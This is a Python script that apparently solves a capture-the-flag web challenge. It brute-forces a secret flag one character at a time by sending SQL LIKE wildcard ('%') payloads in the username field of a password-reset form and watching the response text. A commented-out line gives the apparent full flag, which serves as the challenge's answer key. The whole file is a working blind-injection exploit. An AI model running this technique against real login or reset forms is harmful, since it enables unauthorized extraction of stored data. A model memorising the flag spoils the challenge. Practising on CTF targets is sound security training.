import aiohttp
import asyncio
def _(arg):
    pass
debug = print
host = 'http://like-it-or-not.031337.xyz'
#guess = 'ictf{n0t_4ll_1njections_ar3_creat3d_equ4l}'
guess = 'ictf{';
payload = list(guess+' '*50)
idx = len(guess)
asciz = [chr(e) for e in range(0x20, 0x7f) if chr(e) != '%']

async def make_guess(c):
    global payload,idx
    flag = ''.join(e for e in ['%']+payload[:idx]+[c]+['%'])
    
    data = {'username':flag}
    debug(f'trying: {flag}')
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(host, data=data) as r:

                text = await r.text()
                debug(f'==> [{r.status}]: {text}')
                if 'Password reset email sent' in text:
                    debug(f'valid flag:{flag[1:-1]}')
                    payload[idx] = c
                    idx += 1
                elif 'ictf{' in text:
                    print(f'got: {text}')
    except Exception as e:
        print(f'Exception: {e}')
while True:
    for i in range(0, len(asciz)):
        c = asciz[i]
        loop = asyncio.get_event_loop()
        loop.run_until_complete(make_guess(c))
        
